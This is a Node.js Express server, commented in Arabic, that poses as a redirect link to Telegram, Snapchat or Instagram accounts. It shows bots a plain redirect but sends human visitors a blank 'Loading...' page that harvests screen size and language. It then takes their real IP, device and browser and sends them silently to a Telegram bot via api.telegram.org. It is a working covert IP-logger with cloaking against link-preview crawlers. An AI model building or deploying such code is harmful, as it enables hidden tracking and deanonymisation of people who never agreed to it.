const express = require('express');
const app = express();
const PORT = process.env.PORT || 3000;

// دالة تحليل نوع الجهاز
const getDeviceDetails = (ua) => {
    let device = "Desktop/Unknown";
    let browser = "Unknown";
    
    if (ua.includes("iphone")) device = "iPhone";
    else if (ua.includes("android")) device = "Android";
    else if (ua.includes("ipad")) device = "iPad";
    else if (ua.includes("macintosh")) device = "Mac";
    
    if (ua.includes("chrome") && !ua.includes("edge")) browser = "Chrome";
    else if (ua.includes("safari") && !ua.includes("chrome")) browser = "Safari";
    else if (ua.includes("firefox")) browser = "Firefox";
    else if (ua.includes("edg/")) browser = "Edge";
    
    return { device, browser };
};

app.get('*', async (req, res) => {
    // تجاهل الأيقونات وملفات النظام
    if (req.url.includes('favicon.ico') || req.url.includes('robots.txt')) {
        return res.status(204).end();
    }

    const userAgent = (req.headers['user-agent'] || '').toLowerCase();
    const isBot = userAgent.includes('bot') || userAgent.includes('facebookexternalhit');

    // تحديد الوجهة والروابط
    const to = req.query.to; 
    const path = req.path;
    const telegramUrl = "https://t.me/uUl8iPwh5iYTVk";
    const snapUrl = "https://www.snapchat.com/add/rossan2682";
    const oldInstaUrl = "https://ig.me/j/AbapZ-hZJ16gK_d4/";
    const newInstaChannelUrl = "https://www.instagram.com/channel/AbYsIbwIHyJ3tWZq/";

    let targetUrl = telegramUrl;
    let destinationName = 'Telegram';

    if (path.includes('AbYsIbwIHyJ3tWZq')) {
        targetUrl = newInstaChannelUrl;
        destinationName = 'Instagram Channel';
    } else if (to === 'insta') {
        targetUrl = oldInstaUrl;
        destinationName = 'Instagram';
    } else if (to === 'snap') {
        targetUrl = snapUrl;
        destinationName = 'Snapchat';
    }

    // إذا كان الطارق بوتاً، وجهه فوراً دون تشغيل جافا سكربت المتصفح
    if (isBot) {
        return res.redirect(302, targetUrl);
    }

    // الخطوة الذكية: إذا لم تكن معلومات الشاشة موجودة في الرابط، قم بجلبها أولاً
    if (!req.query.sw) {
        return res.send(`
            <!DOCTYPE html>
            <html>
            <head>
                <title>Loading...</title>
                <meta charset="utf-8">
                <meta name="viewport" content="width=device-width, initial-scale=1.0">
                <style>body { background-color: #000; }</style>
            </head>
            <body>
                <script>
                    // قراءة أبعاد الشاشة واللغة من المتصفح مباشرة
                    const currentUrl = new URL(window.location.href);
                    currentUrl.searchParams.set('sw', window.screen.width);
                    currentUrl.searchParams.set('sh', window.screen.height);
                    currentUrl.searchParams.set('lang', navigator.language || navigator.userLanguage);
                    // إعادة توجيه السيرفر لنفسه ومعه البيانات الجديدة
                    window.location.href = currentUrl.toString();
                </script>
            </body>
            </html>
        `);
    }

    // بمجرد توفر البيانات في الرابط، نقرأها هنا بالسيرفر
    const screenWidth = req.query.sw;
    const screenHeight = req.query.sh;
    const userLanguage = req.query.lang || 'Unknown';

    // جلب الآي بي الفعلي
    const xRealIp = req.headers['x-real-ip'];
    const xForwardedFor = req.headers['x-forwarded-for'];
    const visitorIp = xRealIp || (xForwardedFor ? xForwardedFor.split(',')[0].trim() : req.socket.remoteAddress) || 'Unknown IP';
    
    const details = getDeviceDetails(userAgent);

    // الإرسال للتليجرام
    const token = process.env.TELEGRAM_TOKEN;
    const chatId = process.env.TELEGRAM_CHAT_ID;
    
    if (token && chatId) {
        const messageText = `🚨 New Visitor!\nTo: ${destinationName}\nIP: ${visitorIp}\n📱 Device: ${details.device}\n🌐 Browser: ${details.browser}\n🖥 Screen: ${screenWidth}x${screenHeight}\n🗣 Language: ${userLanguage}`;
        const url = `https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(messageText)}`;
        
        try {
            await fetch(url);
        } catch (err) {}
    }

    // التوجيه النهائي للرابط المطلوب
    res.redirect(302, targetUrl);
});

module.exports = app;
app.listen(PORT);
